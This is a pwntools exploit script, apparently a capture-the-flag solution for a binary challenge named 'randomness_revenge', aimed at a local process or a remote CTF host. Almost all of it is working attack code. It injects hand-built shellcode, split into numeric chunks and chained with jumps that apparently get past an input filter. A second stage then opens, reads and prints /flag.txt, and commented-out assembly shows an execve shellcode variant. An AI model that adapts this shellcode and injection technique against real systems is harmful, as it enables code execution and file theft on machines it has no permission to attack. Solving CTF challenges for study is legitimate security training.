#!/usr/bin/python3

from pwn import *

exe = ELF('randomness_revenge_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        # brva 0x1628

        c
        ''')
        input()


if args.REMOTE:
    p = remote('1337.sb', 40006)
else:
    p = process(exe.path)
# GDB()

# pa = asm(f"""
#     pop rsi
#     shr rsi, 32
    
#     """)
# pa += b'\xeb'
# pa += asm("""
#         shl rsi, 32
#         jmp s2
#         inc ebx
#         s2:
#             xor ecx, eax
#             pop rbx
#             jmp s3
#             inc ebx
#             nop
#             s3:
#                 xor eax, eax
#                 jmp s4
#                 inc ebx
#                 inc ebx
#                 s4:
#                     nop
#                     nop
#                     pop rdx
#                     jmp s5
#                     inc ebx
#                     inc ebx
#                     nop
#                     s5:
#                         nop
#                         nop
#                         jmp s6
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         s6:
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             mov edx, edx
#                             xor edi, edi
#                             jmp s7
#                             inc ebx
#                             s7:
#                                 add rsi, rcx
#                                 syscall
#                             """)
pa = b'^H\xc1\xee \xebH\xc1\xe6 \xeb\x02\xff\xc31\xc1[\xeb\x03\xff\xc3\x901\xc0\xeb\x04\xff\xc3\xff\xc3\x90\x90Z\xeb\x05\xff\xc3\xff\xc3\x90\x90\x90\xeb\x1e\xff\xc3\xff\xc3\xff\xc3\xff\xc3\xff\xc3\xff\xc3\xff\xc3\xff\xc3\xff\xc3\xff\xc3\xff\xc3\xff\xc3\xff\xc3\xff\xc3\xff\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x89\xd21\xff\xeb\x02\xff\xc3H\x01\xce\x0f\x05'

# pa = asm(f"""
#     nop
#     nop
#     nop
#     nop
#     jmp s1
#     inc ebx
#     s1:
#         add rdi, [rsp]
#         jmp s2
#         inc ebx
#         s2:
#             xor si, si
#             jmp s3
#             inc ebx
#             nop
#             s3:
#                 xor edx, edx
#                 jmp s4
#                 inc ebx
#                 inc ebx
#                 s4:
#                     nop
#                     nop
#                     nop
#                     jmp s5
#                     inc ebx
#                     inc ebx
#                     nop
#                     s5:
#                         nop
#                         nop
#                         jmp s6
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         s6:
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             xor eax, eax
#                             add al, 0x3b
#                             syscall


#     """)
len = 256
sla(b' number: ', str(len))
pa = pa.replace(b'\xFF\xC3', b'').replace(
    b'\x48\xFF\xC3', b'').replace(b"\x48\xFF\xC3\x59", b'')
for i in range(len):
    sl(str(u64(pa[i*6:i*6+6].ljust(8, b'\0'))))
pa = b'/flag.txt\0'.ljust(0x5d, b'a') + b'I\x89\xf7E1\xd21\xc0f\xb8\x01\x011\xffL\x89\xfe\x99\x0f\x05H\x89\xc71\xc0j@ZL\x89\xfe\x0f\x05j\x01Xj\x01_j@ZL\x89\xfe\x0f\x05'
    # asm("mov r15, rsi"+shellcraft.amd64.linux.syscall('SYS_openat', 0, 'r15', 0, 0) +
    #     shellcraft.amd64.linux.syscall('SYS_read', 'rax', 'r15', 0x40) +
    #     shellcraft.amd64.linux.syscall('SYS_write', 1, 'r15', 0x40))
# input()

s(pa)
p.interactive()
